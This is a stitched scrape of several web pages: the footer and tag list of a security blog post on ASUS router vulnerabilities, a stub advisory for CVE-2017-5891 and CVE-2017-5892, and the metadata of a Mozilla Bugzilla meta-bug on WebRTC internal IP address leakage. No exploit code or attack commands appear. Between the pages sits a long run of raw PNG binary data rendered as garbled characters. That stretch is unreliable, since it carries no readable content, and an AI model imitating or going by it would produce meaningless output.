[eff](https://wwws.nightwatchcybersecurity.com/tag/eff/)
[facebook](https://wwws.nightwatchcybersecurity.com/tag/facebook/)
[firefox](https://wwws.nightwatchcybersecurity.com/tag/firefox/)
[fireos](https://wwws.nightwatchcybersecurity.com/tag/fireos/)
[github](https://wwws.nightwatchcybersecurity.com/tag/github/)
[gmail](https://wwws.nightwatchcybersecurity.com/tag/gmail/)
[google](https://wwws.nightwatchcybersecurity.com/tag/google/)
[gps](https://wwws.nightwatchcybersecurity.com/tag/gps/)
[hackerone](https://wwws.nightwatchcybersecurity.com/tag/hackerone/)
[intel](https://wwws.nightwatchcybersecurity.com/tag/intel/)
[io17](https://wwws.nightwatchcybersecurity.com/tag/io17/)
[java](https://wwws.nightwatchcybersecurity.com/tag/java/)
[jdk](https://wwws.nightwatchcybersecurity.com/tag/jdk/)
[jenkins](https://wwws.nightwatchcybersecurity.com/tag/jenkins/)
[jre](https://wwws.nightwatchcybersecurity.com/tag/jre/)
[jsonp](https://wwws.nightwatchcybersecurity.com/tag/jsonp/)
[kindle](https://wwws.nightwatchcybersecurity.com/tag/kindle/)
[macos](https://wwws.nightwatchcybersecurity.com/tag/macos/)
[messenger](https://wwws.nightwatchcybersecurity.com/tag/messenger/)
[microsoft](https://wwws.nightwatchcybersecurity.com/tag/microsoft/)
[mozilla](https://wwws.nightwatchcybersecurity.com/tag/mozilla/)
[no-ssl](https://wwws.nightwatchcybersecurity.com/tag/no-ssl/)
[office 365](https://wwws.nightwatchcybersecurity.com/tag/office-365/)
[open-redirect](https://wwws.nightwatchcybersecurity.com/tag/open-redirect/)
[oracle](https://wwws.nightwatchcybersecurity.com/tag/oracle/)
[paypal](https://wwws.nightwatchcybersecurity.com/tag/paypal/)
[pia](https://wwws.nightwatchcybersecurity.com/tag/pia/)
[pillpack](https://wwws.nightwatchcybersecurity.com/tag/pillpack/)
[privacy](https://wwws.nightwatchcybersecurity.com/tag/privacy/)
[qualcomm](https://wwws.nightwatchcybersecurity.com/tag/qualcomm/)
[routers](https://wwws.nightwatchcybersecurity.com/tag/routers/)
[s3](https://wwws.nightwatchcybersecurity.com/tag/s3/)
[samsung](https://wwws.nightwatchcybersecurity.com/tag/samsung/)
[spectorsoft](https://wwws.nightwatchcybersecurity.com/tag/spectorsoft/)
[ssl](https://wwws.nightwatchcybersecurity.com/tag/ssl/)
[supplychainattack](https://wwws.nightwatchcybersecurity.com/tag/supplychainattack/)
[synack](https://wwws.nightwatchcybersecurity.com/tag/synack/)
[tinycards](https://wwws.nightwatchcybersecurity.com/tag/tinycards/)
[tomcat](https://wwws.nightwatchcybersecurity.com/tag/tomcat/)
[united](https://wwws.nightwatchcybersecurity.com/tag/united/)
[vpn](https://wwws.nightwatchcybersecurity.com/tag/vpn/)
[whatsapp](https://wwws.nightwatchcybersecurity.com/tag/whatsapp/)
[wickr](https://wwws.nightwatchcybersecurity.com/tag/wickr/)
[windows](https://wwws.nightwatchcybersecurity.com/tag/windows/)
[yandex](https://wwws.nightwatchcybersecurity.com/tag/yandex/)
[zoho](https://wwws.nightwatchcybersecurity.com/tag/zoho/)
# Subscribe to Blog via Email

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Email Address:

Subscribe

Join 1,120 other subscribers

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Bugcrowd](https://bugcrowd.com/nightwatch-cybersecurity)
* [HackerOne](https://hackerone.com/nightwatch-cybersecurity)
* [Twitter](https://twitter.com/nightwatchcyber)

* [Comment](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)

  Join 115 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F05%252F09%252Fmultiple-vulnerabilities-in-asus-routers%252F)
* Privacy
* + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F05%252F09%252Fmultiple-vulnerabilities-in-asus-routers%252F)
  + [Copy shortlink](https://wp.me/p7EvFy-nh)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/)
  + [View post in Reader](https://wordpress.com/read/blogs/113089212/posts/1443)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from 0.gravatar.com_463420c9_20250126_024814.html ===
�PNG

   
IHDR   <   <   :��r    pHYs  �  ��+   �IDATh�͚{LTWǿ�t"e�A�q�����3�Z\_T�,Ev��,�R�w�����v1NJ},�֚ML�q�"�E�%���#0Z����mY�� J��#��x.��9�ι��MH��s�������{�D캸;��K�e���&�1ST���9�y\M��F�sh�{�eW�I�PJ��ft%i�̃��8����lc�n+BE�i� ��U�쬚Sۊ���n+b��m({���Ȓ�b�Vj���HXb��C~rZZ���t���FQ�S�ڞ:�K<�G��2Њ��<&TIZ1�f���68���i  `u� 2��������>�>�Or��%"�ł"@ �B�4��4�pi�+�3 H.�ͩ�v�:��<Ի�)ص��]�ڞ:l�����Tw��ݵ��H��'硲�J%�i�CȵН�S����Vg �=O�X����D���K�J Dwq�� �@��H#Vg ��e��\_�.=�i@���J(�:C:D��@ @\_���6&0 ,����+,�~�\*G��iu��M��믇ڐaI�^�y�9d����l[���YT/����cx��<���C�%]��?�:P�q�}����N1O��2 ���%�粲-�]��/���w2W|�نߦ�J��N�!޾��x��r�\*E�e�s�!���چxsW)־�]"־�]"�6�Z� 0�3"�) �.�e�J��2o�2�i�E�%�]u��vY�]"�e�� ��!-�gD�%�]�Z��.���4-�ՁW����.Q�@+�ݽ��]�ڞ:dZ�5�K����[Cm\w@�V�\��]����#��-�ڧ�>��F����nC���m��.��ǒ)\*�f�K:>���%
�s��DY[t8�RN�S��H�k5X�|M+�h��F�� ^[��L��>g�E/��.B������V�%��Gcc�4�k��GcB�D�c���%4��
&�����?�?�&8��141̽f�� 8�r��~Dd��Q  �m=
�9��5!#ގ�;e������F��W�ự>!XZߍ��ݯޓ�j�4��S0E�q�t:Z���n �q ��v�
F�Q�J�Ž�]�a�rZ`;M��6���qtRS�N[�]p���'��ˠ����C��-sT �0VV
��A/^\_��h}�Z-?o;)�Gf]f��LK�W���Jw��� V�R�.��v&8��l,��hj�0�M)���" �� �6��LK��o�����JK�b��xGn|�y����ġ��8�|�ӓ��ޟő���S�ء�ePi�%�5MNObO���h��ƞ�04o��-���FCӽf8��/B�DC�hnG��E�6��%�yЋ��8��~Fwl�Qn~|��~M�����3��C�vV�C�<x}^�m}~޿��y�iu��֣����#]��8=��M����K��Ժ���:P���t�Xv#�Uj�B���p���DA�DZ����P�j!B+4�H<0>�kw��j���?�R,�����l��VS���;�O�x�Z�Z4|h��$ן�v\*40�~| ����C��xȡՆ.}C �<�����F�-|�{\Mw�Ƶeƥ��~=Ԇ�G�9q#���v(̽/]�R�����s�p�K� �]"� >�T�h}�p[���ps�޲� �"SgX�Q�R�}4�t��$��~2-��e\*K��/�Z��:=r�r���>W�!]�]#�������"С�5��'P�R��������\*D�Ak��X�4�(<���bA�&&��ҔHm�K��Ң���C@=WXZ,������|��Z�(��P�aM�����K��JYX��h��]wJҊU1�4\_ KT��d5��������نg|>@�/�$`�g |>A�����f~��6�j��p��m��t�f����Ӳ�XP��S�>����
,��Y��������mX��Vl�3��� ��Q���V�f�b���c��S�Iz��S�@+>l:�D Ò��w0�x\�c��2~�ҵ�͜�v�m\��?���h��
�}<�=�.
F�@��,PK�%0����?����W���}�'����з�o"7)z;O�G:Q��
9�I,���ݜ��7�
uш���L�ي�󐛔�w����&��ߔ���=\P��č([��B�z>9(m��}� ���`\�=G(���MA��w�ᕙ
<�DK s�x{�J�fI��Z(ѣA�
W�aO`E�emO.ܩgֽ�,h�pU%bnK�=҅��B�s��4�h�Sj�ɴ��2vs\*w~s�aK��I�%6'n���DKZ"���'Ӹ�׈�����A��C���J\�z�%�q%����\*5��E�,<��J��� 9�����iL    IEND�B`�

=== Content from wwws.nightwatchcybersecurity.com_b338a0f5_20250126_024818.html ===

[Skip to content](#content)
[![](https://wwws.nightwatchcybersecurity.com/wp-content/uploads/2016/06/1-coojnfoayruptsimgys6tw.png?w=140)](https://wwws.nightwatchcybersecurity.com/)
# [Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/)

## Cybersecurity services and research

Menu

* [Home](https://wwws.nightwatchcybersecurity.com/)
* [Blog](https://wwws.nightwatchcybersecurity.com/blog/)
* [Presentations](https://wwws.nightwatchcybersecurity.com/presentations/)
* [Tools](https://wwws.nightwatchcybersecurity.com/tools/)
* [Contact](https://wwws.nightwatchcybersecurity.com/contact/)

[Home](https://wwws.nightwatchcybersecurity.com/)Advisory: CVE-2017-5891 and CVE-2017-5892 (Pending)
# Advisory: CVE-2017-5891 and CVE-2017-5892 (Pending)

[March 8, 2017May 11, 2017](https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/) [nightwatchcyber](https://wwws.nightwatchcybersecurity.com/author/nightwatchcyber/)
[Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/)

~~These are expected to be published publicly in the end of April 2017~~

This has [been published here](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/).

### Share this:

* [Twitter](https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/?share=twitter "Click to share on Twitter")
* [Facebook](https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/?share=facebook "Click to share on Facebook")
Like Loading...

# Post navigation

[← Research: The Dangers of Proxying S3 Content](https://wwws.nightwatchcybersecurity.com/2017/03/08/research-the-dangers-of-proxying-s3-content/) [Advisory: ChromeOS / ChromeBooks Persist Certain Network Settings in Guest Mode →](https://wwws.nightwatchcybersecurity.com/2017/04/09/advisory-chromeos-chromebooks-persist-certain-network-settings-in-guest-mode/)

### Leave a comment [Cancel reply](/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/#respond)

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

# Search

Search for:

# Categories

* [Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/) (66)
* [Opinion](https://wwws.nightwatchcybersecurity.com/category/opinion/) (4)
* [Research](https://wwws.nightwatchcybersecurity.com/category/research/) (43)
* [Tools](https://wwws.nightwatchcybersecurity.com/category/tools/) (4)
* [Uncategorized](https://wwws.nightwatchcybersecurity.com/category/uncategorized/) (2)

# Recent Posts

* [Insecure Bootstrap Process in Google’s Cloud SQL Proxy](https://wwws.nightwatchcybersecurity.com/2023/03/19/insecure-bootstrap-process-in-googles-cloud-sql-proxy/)
* [RFC 9116 / “security.txt” Has Been Published](https://wwws.nightwatchcybersecurity.com/2022/04/27/rfc-9116-security-txt-has-been-published/)
* [GitBleed – Finding Secrets in Mirrored Git Repositories – CVE-2022-24975](https://wwws.nightwatchcybersecurity.com/2022/02/11/gitbleed/)
* [Insecure Bootstrap Process in Oracle Cloud CLI](https://wwws.nightwatchcybersecurity.com/2022/02/06/insecure-bootstrap-process-in-oracle-cloud-cli/)
* [Three Reasons Why Log4J Is So Bad: Ubiquity, Severity and Exploitability](https://wwws.nightwatchcybersecurity.com/2021/12/31/three-reasons-why-log4j-is-so-bad-ubiquity-severity-and-exploitability/)
# Tags

[adobe](https://wwws.nightwatchcybersecurity.com/tag/adobe/)
[airflow](https://wwws.nightwatchcybersecurity.com/tag/airflow/)
[amazon](https://wwws.nightwatchcybersecurity.com/tag/amazon/)
[Android](https://wwws.nightwatchcybersecurity.com/tag/android/)
[apache](https://wwws.nightwatchcybersecurity.com/tag/apache/)
[apple](https://wwws.nightwatchcybersecurity.com/tag/apple/)
[arro](https://wwws.nightwatchcybersecurity.com/tag/arro/)
[asus](https://wwws.nightwatchcybersecurity.com/tag/asus/)
[avg](https://wwws.nightwatchcybersecurity.com/tag/avg/)
[aws](https://wwws.nightwatchcybersecurity.com/tag/aws/)
[boozt](https://wwws.nightwatchcybersecurity.com/tag/boozt/)
[bounties](https://wwws.nightwatchcybersecurity.com/tag/bounties/)
[browsers](https://wwws.nightwatchcybersecurity.com/tag/browsers/)
[bsidesdc](https://wwws.nightwatchcybersecurity.com/tag/bsidesdc/)
[bsidesde](https://wwws.nightwatchcybersecurity.com/tag/bsidesde/)
[bugcrowd](https://wwws.nightwatchcybersecurity.com/tag/bugcrowd/)
[chrome](https://wwws.nightwatchcybersecurity.com/tag/chrome/)
[chromebook](https://wwws.nightwatchcybersecurity.com/tag/chromebook/)
[chromeos](https://wwws.nightwatchcybersecurity.com/tag/chromeos/)
[cisco](https://wwws.nightwatchcybersecurity.com/tag/cisco/)
[conferences](https://wwws.nightwatchcybersecurity.com/tag/conferences/)
[content-spoofing](https://wwws.nightwatchcybersecurity.com/tag/content-spoofing/)
[crosswalk](https://wwws.nightwatchcybersecurity.com/tag/crosswalk/)
[csrf](https://wwws.nightwatchcybersecurity.com/tag/csrf/)
[cve-2019-0221](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0221/)
[cve-2019-0232](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0232/)
[cve-2019-10320](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-10320/)
[duolingo](https://wwws.nightwatchcybersecurity.com/tag/duolingo/)
[eblaster](https://wwws.nightwatchcybersecurity.com/tag/eblaster/)
[eff](https://wwws.nightwatchcybersecurity.com/tag/eff/)
[facebook](https://wwws.nightwatchcybersecurity.com/tag/facebook/)
[firefox](https://wwws.nightwatchcybersecurity.com/tag/firefox/)
[fireos](https://wwws.nightwatchcybersecurity.com/tag/fireos/)
[github](https://wwws.nightwatchcybersecurity.com/tag/github/)
[gmail](https://wwws.nightwatchcybersecurity.com/tag/gmail/)
[google](https://wwws.nightwatchcybersecurity.com/tag/google/)
[gps](https://wwws.nightwatchcybersecurity.com/tag/gps/)
[hackerone](https://wwws.nightwatchcybersecurity.com/tag/hackerone/)
[intel](https://wwws.nightwatchcybersecurity.com/tag/intel/)
[io17](https://wwws.nightwatchcybersecurity.com/tag/io17/)
[java](https://wwws.nightwatchcybersecurity.com/tag/java/)
[jdk](https://wwws.nightwatchcybersecurity.com/tag/jdk/)
[jenkins](https://wwws.nightwatchcybersecurity.com/tag/jenkins/)
[jre](https://wwws.nightwatchcybersecurity.com/tag/jre/)
[jsonp](https://wwws.nightwatchcybersecurity.com/tag/jsonp/)
[kindle](https://wwws.nightwatchcybersecurity.com/tag/kindle/)
[macos](https://wwws.nightwatchcybersecurity.com/tag/macos/)
[messenger](https://wwws.nightwatchcybersecurity.com/tag/messenger/)
[microsoft](https://wwws.nightwatchcybersecurity.com/tag/microsoft/)
[mozilla](https://wwws.nightwatchcybersecurity.com/tag/mozilla/)
[no-ssl](https://wwws.nightwatchcybersecurity.com/tag/no-ssl/)
[office 365](https://wwws.nightwatchcybersecurity.com/tag/office-365/)
[open-redirect](https://wwws.nightwatchcybersecurity.com/tag/open-redirect/)
[oracle](https://wwws.nightwatchcybersecurity.com/tag/oracle/)
[paypal](https://wwws.nightwatchcybersecurity.com/tag/paypal/)
[pia](https://wwws.nightwatchcybersecurity.com/tag/pia/)
[pillpack](https://wwws.nightwatchcybersecurity.com/tag/pillpack/)
[privacy](https://wwws.nightwatchcybersecurity.com/tag/privacy/)
[qualcomm](https://wwws.nightwatchcybersecurity.com/tag/qualcomm/)
[routers](https://wwws.nightwatchcybersecurity.com/tag/routers/)
[s3](https://wwws.nightwatchcybersecurity.com/tag/s3/)
[samsung](https://wwws.nightwatchcybersecurity.com/tag/samsung/)
[spectorsoft](https://wwws.nightwatchcybersecurity.com/tag/spectorsoft/)
[ssl](https://wwws.nightwatchcybersecurity.com/tag/ssl/)
[supplychainattack](https://wwws.nightwatchcybersecurity.com/tag/supplychainattack/)
[synack](https://wwws.nightwatchcybersecurity.com/tag/synack/)
[tinycards](https://wwws.nightwatchcybersecurity.com/tag/tinycards/)
[tomcat](https://wwws.nightwatchcybersecurity.com/tag/tomcat/)
[united](https://wwws.nightwatchcybersecurity.com/tag/united/)
[vpn](https://wwws.nightwatchcybersecurity.com/tag/vpn/)
[whatsapp](https://wwws.nightwatchcybersecurity.com/tag/whatsapp/)
[wickr](https://wwws.nightwatchcybersecurity.com/tag/wickr/)
[windows](https://wwws.nightwatchcybersecurity.com/tag/windows/)
[yandex](https://wwws.nightwatchcybersecurity.com/tag/yandex/)
[zoho](https://wwws.nightwatchcybersecurity.com/tag/zoho/)
# Subscribe to Blog via Email

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Email Address:

Subscribe

Join 1,120 other subscribers

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Bugcrowd](https://bugcrowd.com/nightwatch-cybersecurity)
* [HackerOne](https://hackerone.com/nightwatch-cybersecurity)
* [Twitter](https://twitter.com/nightwatchcyber)

* [Comment](https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)

  Join 115 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F03%252F08%252Fadvisory-cve-2017-5891-and-cve-2017-5892-pending%252F)
* Privacy
* + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F03%252F08%252Fadvisory-cve-2017-5891-and-cve-2017-5892-pending%252F)
  + [Copy shortlink](https://wp.me/p7EvFy-k3)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/)
  + [View post in Reader](https://wordpress.com/read/blogs/113089212/posts/1243)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from bugzilla.mozilla.org_ef04e365_20250126_024817.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/959893)
* [XML](/show_bug.cgi?ctype=xml&id=959893)

Open
[Bug 959893](/show_bug.cgi?id=959893)

Opened 11 years ago
Updated 2 years ago

# [meta] WebRTC Internal IP Address Leakage

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

[meta] WebRTC Internal IP Address Leakage

## Categories

### (Core :: WebRTC: Signaling, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=WebRTC%3A%20Signaling#WebRTC%3A%20Signaling)

WebRTC: Signaling
▾

Core :: WebRTC: Signaling
Bugs in WebRTC call-setup and re-negotiation code, in particular JSEP and SDP handling
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=WebRTC%3A%20Signaling&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=WebRTC%3A%20Signaling&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=WebRTC%3A%20Signaling)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Trunk

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S3

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

NEW

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

NEW

---

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Webcompat Score | --- |
| a11y-review | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox36 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox36&o1=equals&v1=wontfix) |
| firefox37 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox37&o1=equals&v1=wontfix) |
| firefox38 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox38&o1=equals&v1=wontfix) |
| firefox39 | --- | [affected](/buglist.cgi?f1=cf_status_firefox39&o1=equals&v1=affected) |
| firefox-esr31 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr31&o1=equals&v1=wontfix) |

|  | Tracking | Status |
| --- | --- | --- |
| firefox36 |  | wontfix |
| firefox37 |  | wontfix |
| firefox38 |  | wontfix |
| firefox39 |  | affected |
| firefox-esr31 |  | wontfix |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: cghwong, Unassigned)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

*Unassigned*

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/73ad8a9a9a903c004d5abe6672db2f7a?d=mm&size=40)  [cghwong](/user_profile?user_id=495629)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/059051e6b5d28b0b6540b2c81cb586e7?d=mm&size=40)  [ng](/user_profile?user_id=552932)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

100 people

## References

### (Depends on 1 open bug, [URL](https://www.privacytools.io/webrtc.html "https://www.privacytools.io/webrtc.html") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=959893&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=959893)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[1066216](/show_bug.cgi?id=1066216 "RESOLVED DUPLICATE - [SECURITY] Firefox disseminates LAN info to the web servers it accesses"), [1126187](/show_bug.cgi?id=1126187 "RESOLVED DUPLICATE - Fingerprinting via IP address"), [1128212](/show_bug.cgi?id=1128212 "RESOLVED DUPLICATE - PeerConnection leaks local IP adresses and treatens user privacy"), [1128236](/show_bug.cgi?id=1128236 "RESOLVED DUPLICATE - When on some VPN software Implementations, STUN candidates will still include your real IP address"), [1128312](/show_bug.cgi?id=1128312 "RESOLVED DUPLICATE - Firefox can send my ISP's IP adress to websites even if I use a tunnel"), [1169066](/show_bug.cgi?id=1169066 "RESOLVED DUPLICATE - WebRTC is leaking internal IP addresses without authorization"), [1403061](/show_bug.cgi?id=1403061 "RESOLVED DUPLICATE - Internal IP disclosure"), [1585203](/show_bug.cgi?id=1585203 "RESOLVED DUPLICATE - Serious Security Flaw shipping with Firefox, Firefox for Android, IOS")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[privacytools.io/webrtc.html](https://www.privacytools.io/webrtc.html "https://www.privacytools.io/webrtc.html")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")

[1466148](/show_bug.cgi?id=1466148 "NEW - WebRTC leaks internal addresses even when camera/mic permissions are not granted")

## Details

### (5 keywords, Whiteboard: [fingerprinting][fp-triaged])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[meta](/buglist.cgi?keywords=meta&resolution=---),
[privacy](/buglist.cgi?keywords=privacy&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-want](/buglist.cgi?keywords=sec-want&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[fingerprinting][fp-triaged]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

48

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 1 obsolete file)

| [fftest.html](/attachment.cgi?id=8360137)  [11 years ago](#c0)  [cghwong](/user_profile?user_id=495629)   814 bytes, text/html |  | [Details](/attachment.cgi?id=8360137&action=edit) |
| --- | --- | --- |
| [statutory add-on to notify users of (new mozPeerConnection)](/attachment.cgi?id=8570681)  [10 years ago](#c58)  [u442650](/user_profile?user_id=442650)   10.26 KB, application/x-xpinstall |  | [Details](/attachment.cgi?id=8570681&action=edit) |
| [statutory add-on to notify users of (new mozPeerConnection), take 2](/attachment.cgi?id=8570682)  [10 years ago](#c59)  [u442650](/user_profile?user_id=442650)   10.26 KB, application/octet-stream |  | [Details](/attachment.cgi?id=8570682&action=edit) |
| [patch](/attachment.cgi?id=8572994)  [10 years ago](#c76)  [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403)   10.83 KB, patch |  | [Details](/attachment.cgi?id=8572994&action=edit) | [Diff](/attachment.cgi?id=8572994&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
